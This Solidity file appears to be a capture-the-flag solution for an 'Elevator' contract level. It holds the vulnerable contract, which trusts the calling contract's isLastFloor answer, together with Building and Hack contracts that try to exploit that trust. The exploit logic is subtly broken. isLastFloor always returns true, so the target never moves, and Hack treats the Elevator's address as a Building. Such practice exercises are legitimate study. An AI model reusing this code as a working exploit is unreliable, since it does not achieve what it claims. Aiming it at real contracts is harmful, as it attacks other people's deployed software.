// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface BuildingItf {
  function isLastFloor(uint) external returns (bool);
}

contract Building is BuildingItf {
    Elevator public elevator;

    constructor(address _elevator) public {
      elevator = Elevator(_elevator);
    }

    function isLastFloor(uint) external override returns (bool) {
        return true;
    }

    function forceGoTo() public {
      elevator.goTo(42);
    }
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Hack {
    // Elevator public elevator;
    Building public myBuilding;

    constructor(address _elevator) public {
      myBuilding = Building(_elevator);
      // elevator = Elevator(_elevator);
    }

    function forceGoTo() public {
      myBuilding.forceGoTo();
    }
}